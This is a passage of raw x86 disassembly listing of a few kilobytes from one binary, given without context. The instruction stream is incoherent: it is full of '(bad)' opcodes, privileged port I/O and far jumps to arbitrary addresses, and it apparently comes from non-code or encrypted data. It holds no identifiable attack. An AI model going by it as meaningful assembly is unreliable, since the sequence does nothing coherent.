  40d88c:	bound  ecx,QWORD PTR [eax]
  40d88e:	cdq    
  40d88f:	out    0xde,al
  40d891:	in     al,0x65
  40d893:	sub    ah,BYTE PTR [ebx-0x49]
  40d896:	div    BYTE PTR [esp+ebx*2+0xf890a1c]
  40d89d:	xchg   DWORD PTR [ebp+0x69a9e02e],ecx
  40d8a3:	mov    ch,0x2a
  40d8a5:	mov    ds:0xade0a5b3,al
  40d8aa:	fld    DWORD PTR [edx+esi*2-0x48d3d376]
  40d8b1:	pop    edx
  40d8b2:	mov    eax,ds:0xb9fad51c
  40d8b7:	ror    BYTE PTR [eax],cl
  40d8b9:	adc    al,0x16
  40d8bb:	add    ah,BYTE PTR [ecx-0x28]
  40d8be:	shl    edi,0xfe
  40d8c1:	adc    al,BYTE PTR [esi-0x4aeb6a87]
  40d8c7:	or     al,0x72
  40d8c9:	repz xchg ebx,eax
  40d8cb:	sub    eax,0x1d620567
  40d8d0:	push   ds
  40d8d1:	loop   0x40d856
  40d8d3:	fdivp  st(5),st
  40d8d5:	lahf   
  40d8d6:	jnp    0x40d8bd
  40d8d8:	jle    0x40d957
  40d8da:	test   eax,0x3ecf3681
  40d8df:	add    ah,BYTE PTR [ecx-0x467e7a77]
  40d8e5:	sub    eax,0x72a97d4c
  40d8ea:	mov    DWORD PTR [edx+0x5],ebx
  40d8ed:	std    
  40d8ee:	call   0xeab2756c
  40d8f3:	push   0x1c
  40d8f5:	xchg   ebx,eax
  40d8f6:	mov    ecx,0x356ef880
  40d8fb:	cs jbe 0x40d94d
  40d8fe:	fistp  DWORD PTR [esi-0x78]
  40d901:	scas   al,BYTE PTR es:[edi]
  40d902:	mov    ds:0x5cd5d06e,al
  40d907:	in     al,dx
  40d908:	je     0x40d919
  40d90a:	push   es
  40d90b:	imul   DWORD PTR [esi-0x15]
  40d90e:	pop    edi
  40d90f:	scas   eax,DWORD PTR es:[edi]
  40d910:	(bad)  
  40d911:	not    DWORD PTR es:[ebx]
  40d914:	ins    DWORD PTR es:[edi],dx
  40d915:	sub    DWORD PTR ds:0x148014e7,0xfffffff3
  40d91c:	test   eax,0xf219845
  40d921:	neg    esp
  40d923:	add    ebp,DWORD PTR [ebp+0x21]
  40d926:	ficomp WORD PTR [esi-0x3b]
  40d929:	icebp  
  40d92a:	sbb    BYTE PTR [ebx-0x26380fd3],dl
  40d930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d931:	dec    esi
  40d932:	pop    ss
  40d933:	push   ecx
  40d934:	xor    al,0xde
  40d936:	inc    edx
  40d937:	mov    ah,0x73
  40d939:	sbb    edx,ecx
  40d93b:	mov    ebp,0x3e737b3
  40d941:	cli    
  40d942:	inc    edx
  40d943:	mov    ds:0x7d4ef3fa,al
  40d948:	scas   al,BYTE PTR es:[edi]
  40d949:	add    ebx,ebp
  40d94b:	out    0xe0,al
  40d94d:	arpl   WORD PTR [eax-0x5b307447],si
  40d953:	inc    ebx
  40d954:	mov    esi,0x1a98b634
  40d959:	(bad)  
  40d95a:	(bad)  
  40d95b:	pop    esi
  40d95c:	xor    bl,BYTE PTR es:[edx+esi*4]
  40d960:	call   0x3d3f576c
  40d965:	add    al,0x26
  40d967:	mov    cl,0xd4
  40d969:	mov    ds:0x9aae45c7,al
  40d96e:	jne    0x40d96e
  40d970:	sti    
  40d971:	xor    BYTE PTR [ecx+0x64],ch
  40d974:	lods   al,BYTE PTR ds:[esi]
  40d975:	cmp    al,0x7c
  40d977:	sbb    ebx,DWORD PTR [eax+0xa]
  40d97a:	aad    0x83
  40d97c:	pop    ds
  40d97d:	sub    al,0x17
  40d97f:	cs clc 
  40d981:	aam    0x26
  40d983:	lds    ecx,FWORD PTR [ebp+0x6b900597]
  40d989:	fild   DWORD PTR [ecx+0x4caddcb4]
  40d98f:	sbb    DWORD PTR [ebp+0x5d7625fd],esi
  40d995:	sbb    al,0xc5
  40d997:	jno    0x40d9f1
  40d999:	cli    
  40d99a:	dec    ebp
  40d99b:	jb     0x40d946
  40d99d:	retf   0xddb5
  40d9a0:	bound  ebp,QWORD PTR [esp+esi*8-0xa354bd3]
  40d9a7:	pop    esi
  40d9a8:	retf   0x5b58
  40d9ab:	push   es
  40d9ac:	sub    cl,BYTE PTR [ebx-0x2c647b1b]
  40d9b2:	jae    0x40d94a
  40d9b4:	mov    ch,0x83
  40d9b6:	add    al,0x1
  40d9b8:	adc    esi,0xffffffe8
  40d9bb:	mov    al,0x2
  40d9bd:	int3   
  40d9be:	rcr    BYTE PTR [ebp-0x3b2cf970],1
  40d9c4:	adc    BYTE PTR [esi-0x7e],dl
  40d9c7:	adc    DWORD PTR [esi+0x29644eff],esp
  40d9cd:	xchg   edi,eax
  40d9ce:	mov    bl,0x3c
  40d9d0:	inc    edx
  40d9d1:	xor    al,0xf2
  40d9d3:	pop    ss
  40d9d4:	fwait
  40d9d5:	adc    dl,ch
  40d9d7:	cmp    ecx,ebx
  40d9d9:	sbb    ebp,esi
  40d9db:	xchg   ch,bl
  40d9dd:	std    
  40d9de:	jns    0x12d8f9cd
  40d9e4:	jbe    0x40d999
  40d9e6:	jle    0x40da3c
  40d9e8:	pop    ebx
  40d9e9:	pop    esi
  40d9eb:	nop
  40d9ec:	adc    al,0x97
  40d9ee:	dec    ebp
  40d9ef:	imul   ecx,DWORD PTR es:[ebp-0x35],0xffffffaa
  40d9f4:	jmp    0x8e76945b
  40d9f9:	addr16 cmp edi,esp
  40d9fc:	xor    bl,al
  40d9fe:	mov    al,ds:0xea5ac07c
  40da03:	xchg   esp,eax
  40da04:	jl     0x40da65
  40da06:	and    BYTE PTR [edi+0x48],0x2d
  40da0a:	icebp  
  40da0b:	jo     0x40da0e
  40da0d:	pop    edi
  40da0e:	or     al,0x7d
  40da10:	repz or edi,edx
  40da13:	cmp    dl,BYTE PTR [ebx]
  40da15:	aad    0x13
  40da17:	xchg   edx,eax
  40da18:	or     esp,DWORD PTR [ecx+0x6b]
  40da1b:	sub    eax,DWORD PTR [edx]
  40da1d:	fsub   st(5),st
  40da1f:	shr    esp,0xda
  40da22:	cmp    eax,0x2b63bec7
  40da27:	popa   
  40da28:	dec    ebx
  40da29:	into   
  40da2a:	lock mov ds:0xed047745,al
  40da30:	mov    esp,0x700c5820
  40da35:	mov    gs,esi
  40da37:	fadd   QWORD PTR [eax-0x3203e32]
  40da3d:	ins    BYTE PTR es:[edi],dx
  40da3e:	jle    0x40da77
  40da40:	imul   esi,ecx,0xffffffec
  40da43:	mov    ecx,0xee6e6605
  40da48:	mov    esp,0xc2be0600
  40da4d:	fwait
  40da4e:	hlt    
  40da4f:	inc    esi
  40da50:	or     cl,BYTE PTR [ebp+0x28cd63fe]
  40da56:	in     eax,0x3e
  40da58:	add    BYTE PTR [ebx],al
  40da5a:	sub    DWORD PTR [ecx+edi*8],esp
  40da5d:	mov    esi,0x6ab93471
  40da62:	push   ebx
  40da63:	push   ecx
  40da64:	idiv   BYTE PTR [edx+0x24fe1498]
  40da6a:	sub    al,0x91
  40da6c:	sbb    eax,0xb751153e
  40da71:	xchg   esi,ecx
  40da73:	mov    eax,0x6dfc23d4
  40da78:	xchg   ebx,eax
  40da79:	jne    0x40dab9
  40da7b:	fcom   QWORD PTR [edx+0x35]
  40da7e:	mov    BYTE PTR [esp+edx*4],al
  40da81:	dec    edx
  40da82:	mov    cl,0x72
  40da84:	fucomip st,st(7)
  40da86:	or     DWORD PTR [ecx+ebp*4],eax
  40da89:	mov    bl,BYTE PTR [eax+0x66]
  40da8c:	lods   al,BYTE PTR ds:[esi]
  40da8d:	sahf   
  40da8e:	test   DWORD PTR [edx+0x65],0x8440a71
  40da95:	test   BYTE PTR [edx+ebp*8],dh
  40da98:	in     eax,0x38
  40da9a:	mov    ?,ebx
  40da9c:	dec    edx
  40da9d:	ficom  DWORD PTR [ecx+0x446dc128]
  40daa3:	xchg   esp,eax
  40daa5:	add    BYTE PTR [edx+0x15],cl
  40daa8:	or     edx,eax
  40daaa:	mov    DWORD PTR [esi],edi
  40daac:	inc    eax
  40daad:	pusha  
  40daae:	xchg   edx,eax
  40daaf:	lahf   
  40dab0:	mov    ecx,0x856295cd
  40dab5:	sbb    BYTE PTR [edx+0x657c19c3],bl
  40dabb:	add    BYTE PTR [ebx],bl
  40dabd:	push   ecx
  40dabe:	push   eax
  40dabf:	ins    BYTE PTR es:[edi],dx
  40dac0:	adc    BYTE PTR [edi-0x1c369d6d],dl
  40dac6:	jg     0x40da51
  40dac8:	mov    ss:0x1fc1f179,al
  40dace:	xor    ebp,ebx
  40dad0:	add    DWORD PTR [ebp-0x7cbf6b45],esi
  40dad6:	aas    
  40dad7:	dec    esi
  40dad8:	jecxz  0x40db2c
  40dada:	jne    0x40db56
  40dadc:	and    BYTE PTR [esi+0x579f2a59],bh
  40dae2:	(bad)  
  40dae3:	xor    bh,cl
  40dae5:	xor    dh,BYTE PTR [ebx-0x466d9a67]
  40daeb:	iret   
  40daec:	pop    esi
  40daed:	jno    0x40db63
  40daef:	in     ax,0x7a
  40daf2:	sbb    BYTE PTR [edx+esi*1+0x39d207da],bh
  40daf9:	xor    eax,0x35496aff
  40dafe:	cs (bad) 
  40db00:	cli    
  40db01:	push   eax
  40db02:	stos   DWORD PTR es:[edi],eax
  40db03:	mov    bl,0x27
  40db05:	rol    DWORD PTR [edx],0xb4
  40db08:	ins    DWORD PTR es:[edi],dx
  40db09:	leave  
  40db0a:	lahf   
  40db0b:	iret   
  40db0c:	dec    esp
  40db0d:	xor    DWORD PTR [ecx-0x70],edx
  40db10:	scas   eax,DWORD PTR es:[edi]
  40db11:	mov    ds:0xf33da8b4,eax
  40db16:	test   eax,0x58259cc7
  40db1b:	mov    ecx,0x82cbdd06
  40db20:	sysenter 
  40db22:	(bad)  
  40db23:	inc    ebp
  40db24:	arpl   cx,dx
  40db26:	das    
  40db27:	push   esi
  40db28:	stos   BYTE PTR es:[edi],al
  40db29:	pop    eax
  40db2a:	jae    0x40dae2
  40db2c:	dec    esp
  40db2d:	mov    WORD PTR [eax-0x56],?
  40db30:	mov    esp,0xb9200b91
  40db35:	sar    DWORD PTR [esp+eiz*8+0x2144aaf],cl
  40db3c:	jle    0x40daf9
  40db3e:	inc    ebx
  40db3f:	add    dh,BYTE PTR [edx+0x4da30505]
  40db45:	jp     0x40db3e
  40db47:	sbb    ecx,esp
  40db49:	push   esp
  40db4a:	shl    DWORD PTR [ebx-0x698db80],cl
  40db50:	aas    
  40db51:	or     dl,bl
  40db53:	add    dl,BYTE PTR [esi+0x5d16cc1b]
  40db59:	xor    al,0x5
  40db5b:	pop    ebp
  40db5c:	sub    ah,dh
  40db5e:	fs inc edi
  40db60:	pop    edx
  40db61:	loop   0x40daf5
  40db63:	sbb    DWORD PTR [esp+ebx*4-0x6046e0ea],eax
  40db6a:	aad    0xe5
  40db6c:	mov    ebx,DWORD PTR [esi-0x5f]
  40db6f:	bound  esi,QWORD PTR [ebp-0x797fc2c8]
  40db75:	jp     0x40db3e
  40db77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db78:	icebp  
  40db79:	out    0x5a,al
  40db7b:	push   edx
  40db7c:	push   ebp
  40db7d:	lods   eax,DWORD PTR ds:[si]
  40db7f:	int    0xbb
  40db81:	(bad)  
  40db82:	into   
  40db83:	mov    dl,ah
  40db85:	ficom  DWORD PTR [ebx]
  40db87:	xchg   ebp,eax
  40db88:	mov    dh,0xbb
  40db8a:	hlt    
  40db8b:	in     al,0xa9
  40db8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db8e:	jmp    DWORD PTR [edi-0x75]
  40db91:	(bad)  
  40db92:	pop    ecx
  40db93:	pop    ss
  40db94:	jg     0x40db65
  40db96:	aaa    
  40db97:	aas    
  40db98:	daa    
  40db99:	pop    es
  40db9a:	adc    ah,al
  40db9c:	dec    edi
  40db9d:	sahf   
  40db9e:	jbe    0x40db66
  40dba0:	xor    BYTE PTR [esp+edi*4-0x75],ah
  40dba4:	daa    
  40dba5:	shl    DWORD PTR [edx+0x23],cl
  40dba8:	mov    ?,WORD PTR es:[ecx]
  40dbab:	pop    ebp
  40dbac:	mov    BYTE PTR [ecx],ch
  40dbae:	add    al,ah
  40dbb0:	xlat   BYTE PTR ds:[ebx]
  40dbb1:	sub    eax,0xf8898a1e
  40dbb6:	mov    bl,0x0
  40dbb8:	pop    edx
  40dbb9:	jno    0x40dc2f
  40dbbb:	cmp    eax,0x7f5af03
  40dbc0:	inc    ebp
  40dbc1:	scas   al,BYTE PTR es:[edi]
  40dbc2:	daa    
  40dbc3:	jo     0x40dba2
  40dbc5:	or     DWORD PTR [ecx-0x64],edi
  40dbc8:	inc    esi
  40dbc9:	push   esi
  40dbca:	(bad)  
  40dbcb:	out    0x8e,al
  40dbcd:	adc    esp,DWORD PTR [ebp+0x74252fa5]
  40dbd3:	rcr    DWORD PTR [ebx+0x1],cl
  40dbd6:	lea    eax,[eax+0x1e13d291]
  40dbdc:	test   BYTE PTR [edi+0x4e],ch
  40dbdf:	cdq    
  40dbe0:	add    al,0x84
  40dbe2:	in     al,0x6e
  40dbe4:	mov    eax,ds:0x4eb4fddc
  40dbe9:	push   ebx
  40dbea:	test   DWORD PTR [ebx-0x31],eax
  40dbed:	dec    bh
  40dbef:	(bad)  
  40dbf0:	add    eax,DWORD PTR ds:0x3438a7ec
  40dbf6:	or     BYTE PTR [edi],ah
  40dbf8:	outs   dx,DWORD PTR ds:[esi]
  40dbf9:	mov    edi,0x1a874834
  40dbfe:	ss jae 0x40dc69
  40dc01:	shr    DWORD PTR [edi],1
  40dc03:	psubb  mm0,mm0
  40dc06:	add    edi,DWORD PTR [esi+0x7eefb20]
  40dc0c:	adc    bh,ah
  40dc0e:	(bad)
  40dc11:	fsubrp st(1),st
  40dc13:	xchg   ebx,eax
  40dc14:	or     eax,0x494b195f
  40dc19:	mov    esp,0x76922734
  40dc1e:	and    DWORD PTR [edi+0x2bfeada5],ebx
  40dc24:	push   edx
  40dc25:	dec    ecx
  40dc26:	imul   ecx,DWORD PTR [edx],0xa01a8a95
  40dc2c:	mov    ch,0xed
  40dc2e:	popa   
  40dc2f:	jl     0x40dbfd
  40dc31:	add    ebp,ebp
  40dc33:	fldenv es:[ebp+ebp*4-0x308d5a4c]
  40dc3b:	dec    edx
  40dc3c:	push   edi
  40dc3d:	cs push edx
  40dc3f:	and    BYTE PTR [edi+0x54bb1780],cl
  40dc45:	out    dx,al
  40dc46:	into   
  40dc47:	push   edx
  40dc48:	ss ins BYTE PTR es:[edi],dx
  40dc4a:	das    
  40dc4b:	xchg   DWORD PTR [edi-0x3a79ef66],edx
  40dc51:	stc    
  40dc52:	dec    eax
  40dc53:	das    
  40dc54:	jns    0x40dc9d
  40dc56:	sub    DWORD PTR [esp+ecx*4-0x57],edx
  40dc5a:	xchg   ebx,eax
  40dc5b:	cdq    
  40dc5c:	and    eax,0x2ce42463
  40dc61:	sbb    eax,0x3ea8babf
  40dc66:	fwait
  40dc67:	mov    ecx,0x94184b6b
  40dc6c:	or     al,0x4c
  40dc6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc6f:	jl     0x40dc1f
  40dc71:	mov    ss,edi
  40dc73:	(bad)  
  40dc74:	sbb    esp,ebp
  40dc76:	mov    bl,0xa5
  40dc78:	jp     0x40dca7
  40dc7a:	and    eax,DWORD PTR [edi-0x28]
  40dc7d:	dec    ebp
  40dc7e:	and    ebp,0x70943f5b
  40dc84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc85:	add    eax,0x63f49ab9
  40dc8a:	inc    esi
  40dc8b:	mov    ch,0x51
  40dc8d:	sbb    bh,BYTE PTR [ebx]
  40dc8f:	xchg   BYTE PTR ds:0x77ee5f1e,dl
  40dc95:	mov    edx,0x89d61b80
  40dc9a:	mov    esp,0x5c611a36
  40dc9f:	xchg   ecx,eax
  40dca0:	fs ja  0x40dd11
  40dca3:	clc    
  40dca4:	adc    edx,DWORD PTR [ecx]
  40dca6:	ret    0xdfa
  40dca9:	mov    esi,0xbe6c3fe8
  40dcae:	add    ah,al
  40dcb0:	sub    BYTE PTR [ecx],dl
  40dcb2:	mov    ecx,0x5a227962
  40dcb7:	xor    al,0x45
  40dcb9:	nop
  40dcba:	(bad)  
  40dcbb:	imul   eax,DWORD PTR [esi],0x31680e10
  40dcc1:	ins    DWORD PTR es:[edi],dx
  40dcc2:	test   BYTE PTR [edi-0x26],0x13
  40dcc6:	mov    dh,0xf8
  40dcc8:	dec    edi
  40dcc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcca:	xor    eax,0x1e21cb69
  40dccf:	lea    ebx,[ebp+0x11]
  40dcd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcd3:	or     eax,0xaa0981e
  40dcd8:	ins    BYTE PTR es:[edi],dx
  40dcd9:	dec    ebp
  40dcda:	imul   eax,DWORD PTR [esp+ecx*1-0x1e8e259d],0xffffffc8
  40dce2:	arpl   WORD PTR [edi],bx
  40dce4:	fiadd  DWORD PTR [edx]
  40dce6:	inc    edi
  40dce7:	dec    ebp
  40dce8:	fidiv  WORD PTR [eax+0x79]
  40dceb:	jmp    0x85b7:0x489304cd
  40dcf2:	nop
  40dcf3:	mov    edi,0x19705ecc
  40dcf8:	xor    al,0x4b
  40dcfa:	out    dx,eax
  40dcfb:	lods   al,BYTE PTR ds:[esi]
  40dcfc:	adc    BYTE PTR ds:0xdcdc3a76,al
  40dd02:	sbb    eax,DWORD PTR [ebx]
  40dd04:	stos   DWORD PTR es:[edi],eax
  40dd05:	clc    
  40dd06:	jp     0x40dd1f
  40dd08:	cmp    ebx,DWORD PTR [edi+0x2d177527]
  40dd0e:	sahf   
  40dd0f:	xor    cl,al
  40dd11:	std    
  40dd12:	ins    BYTE PTR es:[edi],dx
  40dd13:	shl    DWORD PTR [ebp+ebp*4-0x63],0xd2
  40dd18:	or     dh,BYTE PTR [ecx+0x55c6f2e8]
  40dd1e:	imul   esp,DWORD PTR ds:0xb2fe6aa9,0xe005211
  40dd28:	mov    bl,0x50
  40dd2a:	pop    esp
  40dd2b:	push   eax
  40dd2c:	push   cs
  40dd2d:	pop    esp
  40dd2e:	arpl   WORD PTR [eax-0x63],sp
  40dd31:	adc    eax,0x4ab20d4b
  40dd36:	push   0x6c37d6be
  40dd3b:	mov    ebp,0xd01a688c
  40dd40:	and    eax,0xa112aa8c
  40dd45:	mov    ebx,0x96ffb49e
  40dd4a:	jb     0x40ddc4
  40dd4c:	xor    cl,BYTE PTR [ecx-0x3c6ea7a9]
  40dd52:	imul   ecx,ecx,0x5ebc8609
  40dd58:	adc    eax,0x9f55f3ef
  40dd5d:	cwde   
  40dd5e:	pop    edx
  40dd5f:	pop    ebx
  40dd60:	pop    ds
  40dd61:	jnp    0x40ddd2
  40dd63:	pop    ecx
  40dd64:	sbb    BYTE PTR fs:[edi],dh
  40dd67:	push   es
  40dd68:	sbb    al,0xdc
  40dd6a:	retf   0x8de4
  40dd6d:	(bad)  
  40dd6e:	jno    0x40dd0b
  40dd70:	test   al,0xf4
  40dd72:	mov    cl,0xdd
  40dd74:	adc    ebx,ebp
  40dd76:	in     eax,0xae
  40dd78:	jge    0x40dd47
  40dd7a:	ins    BYTE PTR es:[edi],dx
  40dd7b:	cli    
  40dd7c:	ret    0x7244
  40dd7f:	sbb    edi,DWORD PTR [esi]
  40dd81:	sahf   
  40dd82:	xchg   edx,eax
  40dd83:	scas   al,BYTE PTR es:[edi]
  40dd84:	gs cmc 
  40dd86:	pop    ecx
  40dd87:	(bad)  
  40dd89:	sub    ah,BYTE PTR [ebp-0x1b9fb720]
  40dd8f:	cmp    bl,dl
  40dd91:	cmp    DWORD PTR ss:[esi-0x2e4e189e],edx
  40dd98:	inc    ebx
  40dd99:	cmp    BYTE PTR [esi-0x4],bl
  40dd9c:	stos   BYTE PTR es:[edi],al
  40dd9d:	xchg   esp,eax
  40dd9e:	mov    WORD PTR [eax-0x6b02dec2],?
  40dda4:	jmp    0x40dd41
  40dda6:	addr16 pop ebx
  40dda8:	cs push ecx
  40ddaa:	cld    
  40ddab:	pop    esi
  40ddac:	sbb    eax,0xad7488c2
  40ddb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddb3:	fstp   TBYTE PTR [esi+0x20059dbf]
  40ddb9:	sbb    eax,0x5288e474
  40ddbe:	jecxz  0x40ddeb
  40ddc0:	sub    ecx,edx
  40ddc2:	ins    BYTE PTR es:[edi],dx
  40ddc3:	lods   al,BYTE PTR ds:[esi]
  40ddc4:	sub    BYTE PTR [eax+0x24],bh
  40ddc7:	leave  
  40ddc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddc9:	sbb    eax,esp
  40ddcb:	mov    al,ds:0x3b937932
  40ddd0:	sti    
  40ddd1:	push   edx
  40ddd2:	push   esi
  40ddd3:	(bad)  
  40ddd4:	mov    bl,0xe4
  40ddd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddd7:	cdq    
  40ddd8:	adc    DWORD PTR [edx],esi
  40ddda:	adc    eax,0x2b4fc9ca
  40dddf:	int    0xe7
  40dde1:	jnp    0x40de1f
  40dde3:	test   eax,0xf083e75a
  40dde8:	mov    al,ds:0x6f4e50a8
  40dded:	mov    ah,0xcb
  40ddef:	jl     0x40de70
  40ddf1:	test   al,0xe9
  40ddf3:	nop
  40ddf4:	scas   eax,DWORD PTR es:[edi]
  40ddf5:	loopne 0x40de10
  40ddf7:	nop
  40ddf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddf9:	retf   
  40ddfa:	lock xor eax,0xbd622c51
  40de00:	test   eax,0x55f8dc06
  40de05:	mov    WORD PTR [ebx+edi*1-0x12],?
  40de09:	push   ds
  40de0a:	jmp    0x7eb9:0xaca5a838
  40de11:	cmp    DWORD PTR [edi-0x50a83768],esp
  40de17:	xchg   ebp,eax
  40de18:	add    ebx,DWORD PTR [bx-0x68c9]
  40de1d:	or     ebx,DWORD PTR [ebx]
  40de1f:	and    dh,BYTE PTR [ecx+0x50]
  40de22:	jo     0x40de54
  40de24:	out    dx,al
  40de25:	mov    edx,0xf825c34b
  40de2a:	daa    
  40de2b:	fisttp QWORD PTR ds:0x68f0c96b
  40de31:	cmp    BYTE PTR [edi],ah
  40de33:	add    edi,DWORD PTR [ebp+0x5872e3d8]
  40de39:	(bad)  
  40de3a:	sub    BYTE PTR fs:[esi-0x229d7937],dh
  40de41:	dec    eax
  40de42:	bound  ebx,QWORD PTR [edx+0x2d]
  40de45:	(bad)  
  40de46:	cld    
  40de47:	mov    esi,0x3c18b22a
  40de4c:	and    eax,DWORD PTR [edi+0x42]
  40de4f:	test   DWORD PTR [edi+edi*2+0x689e8394],0x68a823b5
  40de5a:	xchg   BYTE PTR [ebp-0x7ac10cda],dl
  40de60:	mov    ecx,0xe859a286
  40de65:	sub    eax,0xb4b9cd23
  40de6a:	in     al,dx
  40de6b:	test   BYTE PTR [ebx+0x7686f1bb],0xd9
  40de72:	in     eax,dx
  40de73:	jne    0x40deb9
  40de75:	std    
  40de76:	(bad)  
  40de77:	out    dx,eax
  40de78:	gs mov esi,esi
  40de7b:	dec    esp
  40de7c:	xor    eax,0xe55eda93
  40de81:	xor    BYTE PTR [eax+0x3b1bec91],dl
  40de87:	xchg   cl,dh
  40de89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de8a:	jmp    0x7979488
  40de8f:	or     BYTE PTR [eax+0x709b589c],bh
  40de95:	or     bl,BYTE PTR [edx-0x43]
  40de98:	out    0x9f,eax
  40de9a:	test   al,0x6
  40de9c:	mov    esp,0x3ac1eb41
  40dea1:	inc    DWORD PTR [ebp-0x54f53828]
  40dea7:	lock xchg ebx,eax
  40dea9:	pop    edi
  40deaa:	scas   eax,DWORD PTR es:[edi]
  40deab:	inc    ebx
  40deac:	dec    eax
  40dead:	pop    edi
  40deae:	popf   
  40deaf:	push   ecx
  40deb0:	dec    edi
  40deb1:	les    edi,FWORD PTR [eax-0x42]
  40deb4:	or     BYTE PTR [ecx-0x780d8a6f],cl
  40deba:	pushf  
  40debb:	retf   0x94fb
  40debe:	and    esp,esp
  40dec0:	in     eax,dx
  40dec1:	dec    esi
  40dec2:	jns    0x40df01
  40dec4:	call   0x21b9634e
  40dec9:	cli    
  40deca:	jno    0x40de6d
  40decc:	xchg   ecx,eax
  40decd:	jge    0x40ded1
  40decf:	add    BYTE PTR [eax-0x2d],bh
  40ded2:	scas   eax,DWORD PTR es:[edi]
  40ded3:	inc    edi
  40ded4:	pushf  
  40ded5:	push   0x51e93661
  40deda:	sbb    cl,BYTE PTR ss:[edx+eax*1+0x55]
  40dedf:	je     0x40df56
  40dee1:	and    esi,ebx
  40dee3:	lods   al,BYTE PTR ds:[esi]
  40dee4:	push   ss
  40dee5:	jb     0x40de6f
  40dee7:	popa   
  40dee8:	unpckhps xmm1,XMMWORD PTR ds:0x3df07ae2
  40deef:	dec    edi
  40def0:	push   esp
  40def1:	jge    0x40deb8
  40def3:	dec    esi
  40def4:	stos   BYTE PTR es:[edi],al
  40def5:	mov    ds:0x707e3912,al
  40defa:	push   esp
  40defb:	cmp    DWORD PTR [edx],0x6f
  40defe:	inc    ecx
  40deff:	mov    ds:0xcf46176c,al
  40df04:	mov    al,0x43
  40df06:	push   edi
  40df07:	cmp    edx,esp
  40df09:	mov    esi,0x4a020ca8
  40df0e:	sub    DWORD PTR [edi-0x19],edx
  40df11:	retf   0xeed6
  40df14:	loope  0x40df29
  40df16:	push   ecx
  40df17:	mov    esp,0xe35a59b1
  40df1c:	jmp    0x907e9bf3
  40df21:	mov    ecx,0xb1f7e3f4
  40df26:	iret   
  40df27:	sub    eax,0x5206399f
  40df2c:	pminub mm3,mm1
  40df2f:	push   ebp
  40df30:	jno    0x40df76
  40df32:	sub    bh,BYTE PTR [ecx]
  40df34:	jb     0x40dec2
  40df36:	xchg   esi,eax
  40df37:	ds xchg esp,eax
  40df39:	fdiv   DWORD PTR [ebx-0x4d0c1f0b]
  40df3f:	pop    ds
  40df40:	add    DWORD PTR [esp+eiz*2],0x61
  40df44:	jl     0x40df2d
  40df46:	jno    0x40df92
  40df48:	and    BYTE PTR ds:0x5bf3d5e,cl
  40df4e:	push   0x5aed4ddc
  40df53:	push   ss
  40df54:	or     BYTE PTR [edx-0x27],ch
  40df57:	imul   ebp,DWORD PTR [ebx],0x4fb35af5
  40df5d:	dec    edi
  40df5e:	fsubr  st(2),st
  40df60:	ds stos BYTE PTR es:[di],al
  40df63:	sub    esi,DWORD PTR [ecx+0x11449538]
  40df69:	mov    al,0xf1
  40df6b:	mov    cl,0x4c
  40df6d:	call   0x83f:0xe2132ce3
  40df74:	cs jne 0x40df05
  40df77:	add    eax,ecx
  40df79:	xor    DWORD PTR ds:0x48c681d6,ebx
  40df7f:	push   edx
  40df80:	jg     0x40df18
  40df82:	mov    al,0x16
  40df84:	jmp    0x40df0a
  40df86:	lahf   
  40df87:	mov    ecx,0x39c8b4d7
  40df8c:	in     al,0x83
  40df8e:	aaa    
  40df8f:	mov    edx,0xb69d4156
  40df94:	cmp    eax,esp
  40df96:	jbe    0x40dfca
  40df98:	jmp    0x2751:0x2b8fbb36
  40df9f:	test   al,0x7
  40dfa1:	adc    ah,BYTE PTR [edi+0x51]
  40dfa4:	lds    esi,FWORD PTR [edx-0x1c789305]
  40dfaa:	sbb    dl,al
  40dfac:	mov    edi,0x385cd3d3
  40dfb1:	icebp  
  40dfb2:	mov    ss,WORD PTR [esi]
  40dfb4:	xchg   ebx,eax
  40dfb5:	pop    ebp
  40dfb6:	mov    dl,0xdb
  40dfb8:	imul   eax,DWORD PTR [edx+ecx*2+0x13804c0d],0x823facc2
  40dfc3:	imul   esi,DWORD PTR [edx+eax*4-0x78],0x2591689c
  40dfcb:	pusha  
  40dfcc:	leave  
  40dfcd:	pop    eax
  40dfce:	pushf  
  40dfcf:	mov    WORD PTR [ebp+eax*2+0x7b],fs
  40dfd3:	dec    edi
  40dfd4:	fldcw  WORD PTR [esi]
  40dfd6:	pop    esp
  40dfd7:	sbb    dh,dl
  40dfd9:	test   DWORD PTR [edx+edx*4+0x18ffbf85],0xd3c4847a
  40dfe4:	rcl    bh,0x61
  40dfe7:	lahf   
  40dfe8:	adc    al,BYTE PTR [ecx+ebx*4-0x7]
  40dfec:	cmp    eax,DWORD PTR ds:0xa5721ab7
  40dff2:	jg     0x40e01f
  40dff4:	sbb    bh,BYTE PTR [eax-0xe]
  40dff7:	sbb    eax,0x7bd9cd1f
  40dffc:	call   0x3337:0xe65cec5c
  40e003:	call   0xdb84d950
  40e008:	aas    
  40e009:	add    eax,0xc0ead2bc
  40e00e:	inc    edi
  40e00f:	cli    
  40e010:	push   ebx
  40e011:	xor    ch,0x7d
  40e014:	sub    DWORD PTR [edi+0x4bb41ba7],ebx
  40e01a:	xor    dl,cl
  40e01c:	fidivr WORD PTR [ebp+0x28]
  40e01f:	pop    ss
  40e020:	mov    al,ds:0xb5261a94
  40e025:	add    DWORD PTR [eax-0x3d],ebx
  40e028:	frstor [ecx]
  40e02a:	popf   
  40e02b:	ret    
  40e02c:	call   0x689:0xf18de6c
  40e033:	aaa    
  40e034:	mov    al,0x47
  40e036:	sub    edx,edi
  40e038:	add    eax,0x84ae603a
  40e03d:	pmullw mm1,QWORD PTR [ecx]
  40e040:	pushf  
  40e041:	mov    ebx,0xa9f0ca73
  40e046:	scas   eax,DWORD PTR es:[edi]
  40e047:	jmp    0xaf08:0x96636057
  40e04e:	sbb    BYTE PTR [ebp+0x7563f44e],bh
  40e054:	in     eax,dx
  40e055:	leave  
